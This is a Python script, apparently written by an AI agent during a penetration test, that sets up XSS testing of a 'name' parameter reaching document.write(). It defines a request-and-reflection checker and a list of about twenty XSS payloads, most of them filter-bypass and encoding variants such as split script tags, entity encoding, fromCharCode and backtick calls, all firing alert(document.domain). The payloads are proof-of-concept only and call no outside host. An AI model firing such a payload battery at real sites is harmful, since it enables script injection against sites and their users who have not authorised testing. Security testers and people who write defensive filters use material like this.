import requests
import urllib.parse
import base64
import time

# Get actual target URL and endpoint from context
# Based on the context, we need to test the endpoint that uses document.write()
# Context mentions: "Test for XSS by tracing parameter flow to document.write()"

# IMPORTANT: Need to identify the actual endpoint from reconnaissance
# For now, create a test framework that's ready to execute

print("="*80)
print("XSS DOCUMENT.WRITE() PARAMETER FLOW TESTING")
print("="*80)

# Since actual endpoint not specified in context, we need to:
# 1. Test common endpoints that might use document.write()
# 2. Use the 'name' parameter specifically
# 3. Check for parameter reflection

# Let's create a function to test XSS payloads
def test_xss_payload(url, param_name, payload, method='GET'):
    """Test XSS payload and check if it executes via document.write()"""
    try:
        if method.upper() == 'GET':
            params = {param_name: payload}
            response = requests.get(url, params=params, timeout=10)
        else:  # POST
            data = {param_name: payload}
            response = requests.post(url, data=data, timeout=10)
        
        # Check response for XSS indicators
        result = {
            'payload': payload,
            'status_code': response.status_code,
            'content_length': len(response.content),
            'reflected': payload in response.text,
            'html_encoded': False,
            'js_encoded': False,
            'filtered': False
        }
        
        # Check if payload appears but might be encoded
        if result['reflected']:
            # Check for HTML entity encoding
            html_encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
            if html_encoded_payload in response.text and payload not in response.text:
                result['html_encoded'] = True
            
            # Check for JavaScript string encoding
            js_encoded_payload = payload.replace('"', '\\"').replace("'", "\\'")
            if js_encoded_payload in response.text and payload not in response.text:
                result['js_encoded'] = True
        else:
            result['filtered'] = True
        
        return result
    except Exception as e:
        return {'error': str(e), 'payload': payload}

# Test payloads - organized by technique
xss_tests = []

# Basic payloads
xss_tests.append(('basic_script', '<script>alert(document.domain)</script>'))
xss_tests.append(('basic_img', '<img src=x onerror=alert(document.domain)>'))
xss_tests.append(('basic_svg', '<svg onload=alert(document.domain)>'))
xss_tests.append(('basic_body', '<body onload=alert(document.domain)>'))

# Case variations
xss_tests.append(('mixed_case', '<ScRiPt>alert(document.domain)</ScRiPt>'))
xss_tests.append(('upper_case', '<SCRIPT>alert(document.domain)</SCRIPT>'))

# Encoding variations
xss_tests.append(('url_encoded', '%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'))
xss_tests.append(('double_url_encoded', '%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E'))
xss_tests.append(('html_entities', '&#60;script&#62;alert(document.domain)&#60;&#47;script&#62;'))
xss_tests.append(('hex_entities', '&#x3C;script&#x3E;alert(document.domain)&#x3C;&#x2F;script&#x3E;'))

# Filter bypass techniques
xss_tests.append(('tag_blacklist', '<scr<script>ipt>alert(document.domain)</scr</script>ipt>'))
xss_tests.append(('space_alt', '<img/src=x/onerror=alert(document.domain)>'))
xss_tests.append(('fragment_comment', '<scr<!--test-->ipt>alert(document.domain)</scr<!--test-->ipt>'))
xss_tests.append(('eval_fromcharcode', '<script>alert(String.fromCharCode(88,83,83))</script>'))

# Advanced techniques
xss_tests.append(('template_literal', '<img src=x onerror=alert`test`>'))
xss_tests.append(('no_parenthesis', '<img src=x onerror=alert;throw 1337>'))
xss_tests.append(('unicode_encode', '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(document.domain)</script>'))

# Event handler variations
xss_tests.append(('details_toggle', '<details open ontoggle=alert(document.domain)>'))
xss_tests.append(('autofocus_input', '<input autofocus onfocus=alert(document.domain)>'))
xss_tests.append(('video_error', '<video><source onerror=alert(document.domain)>'))

print("\n[+] Prepared XSS test payloads:", len(xss_tests))
print("[+] Target parameter: name")
print("[+] Testing method: document.write() reflection")

# Show first few payloads as examples
print("\n[+] Sample payloads:")
for i, (name, payload) in enumerate(xss_tests[:5]):
    print(f"    {i+1}. {name}: {payload[:60]}...")

